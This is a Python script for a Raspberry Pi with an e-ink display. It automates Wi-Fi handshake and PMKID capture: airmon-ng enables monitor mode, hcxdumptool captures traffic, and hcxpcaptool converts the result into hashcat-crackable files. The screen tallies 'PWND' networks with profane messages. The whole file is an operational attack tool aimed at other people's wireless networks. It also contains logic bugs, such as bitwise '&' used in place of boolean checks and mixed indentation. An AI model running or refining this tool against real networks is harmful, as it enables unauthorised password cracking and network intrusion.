#!/usr/bin/python
import os
import subprocess
import time
from papirus import PapirusComposite

essid_list = []

display = PapirusComposite(False, 0)
def initialise_display():
    display.Clear()
    display.WriteAll()
    display.AddText("______________________________________________", 0, 5, 10, Id="top-boarder-line" )
    display.AddText("______________________________________________", 0, 76, 10, Id="bottom-boarder-line" )
    display.AddText("PICAP V!.0", 2, 2, 10, fontPath='fonts/computer.ttf', Id="header" )
    display.AddText("PWND:", 2, 88, 10, fontPath='fonts/computer', Id="footer-pwnd" )
    display.AddText("0" , 45, 86, 11, fontPath='fonts/FreeMonoBold.ttf', Id="footer-num-pwnd" )

    display.AddText('root@picap:>', 2, 15, 13, Id='term')
    display.AddText('Booting Up.....', 2, 28, 13, Id='term-output')
    display.WriteAll(True)

def update_num_pwnd(num_pwnd):
    display.UpdateText("footer-num-pwnd", str(num_pwnd))

def update_ssid_term(ssid):
    display.UpdateText('term','root@%s:>' % ssid)

def update_term_output(text_to_update):
    display.UpdateText("term-output", text_to_update)

def update_all():
    if len(essid_list) > 0 & len(essid_list) < 5:
        update_num_pwnd(len(essid_list))
	update_ssid_term(essid_list[len(essid_list) - 1])
        update_term_output("KEEP THEM COMING!")
    elif len(essid_list) > 5 & len(essid_list) < 10:
        update_num_pwnd(len(essid_list))
        update_ssid_term(len(essid_list) - 1)
        update_term_output("OH SHIT YEAH!")
    elif len(essid_list) > 10 & len(essid_list) < 15:
        update_num_pwnd(len(essid_list))
        update_ssid_term(len(essid_list) - 1)
        update_term_output("WELL FUCK ME!")
    display.WriteAll(True)

def start_monitor_mode():
    try:
        update_term_output("ENABLING MONITOR MODE.....")
        display.WriteAll(True)
        os.system('airmon-ng check kill')
        os.system('airmon-ng start wlan0')
        update_term_output("ENABLED!")
        display.WriteAll(True)
    except:
        update_term_output("Error.      Something Somewhere Fucked Up.")
        display.WriteAll(True)
        print("Error is mon0 enabled?")
        pass

def start_packet_capture():
    #os.spawn(os.P_DETACH, 'hcxdumptool -i wlan0mon -o picap-handshakes.pcapng')
    os.system('rm /home/pi/picap/captures/picap-handshakes.pcapng')
    subprocess.Popen(["hcxdumptool", "-i", "wlan0mon", "-o", "/home/pi/picap/captures/picap-handshakes.pcapng"], stdout=subprocess.PIPE)

## sorted(np.unique(list1+list2))
def process_pcap():
    ## Seperate and sort pmkids/epol handshakes
    os.system('rm /home/pi/picap/captures/picap-handshakes.hccapx')
    os.system('rm /home/pi/picap/captures/picap-handshakes.16800')
    os.system('hcxpcaptool -I /home/pi/picap/captures/essid-names -o /home/pi/picap/captures/picap-handshakes.hccapx -z /home/pi/picap/captures/picap-handshakes.16800 /home/pi/picap/captures/picap-handshakes.pcapng')
    try:
        handshake_file=open("/home/pi/picap/captures/picap-handshakes.16800", "r")
        if handshake_file.mode == 'r':
            handshakes = handshake_file.read()
            handshakes = handshakes.replace("\n", "*")
            handshakes = handshakes.split('*')
            essid_list_unsorted = []
            for i in range(3, len(handshakes), 4):
                essid_list_unsorted.append(handshakes[i].decode('hex'))

            for i in essid_list_unsorted:
                if i not in essid_list:
                    essid_list.append(i)
    except:
        update_term_output("NO PMKIDS YET")
        display.WriteAll(True)


if __name__ == "__main__":
    initialise_display()
    start_monitor_mode()
    start_packet_capture()
    time.sleep(10)
    while True:
        current_num_handshakes = len(essid_list)
        process_pcap()
        if len(essid_list) > current_num_handshakes:
            update_all()
        time.sleep(5)
## for decoding hexsting back into essid
# "hex value".decode('hex')
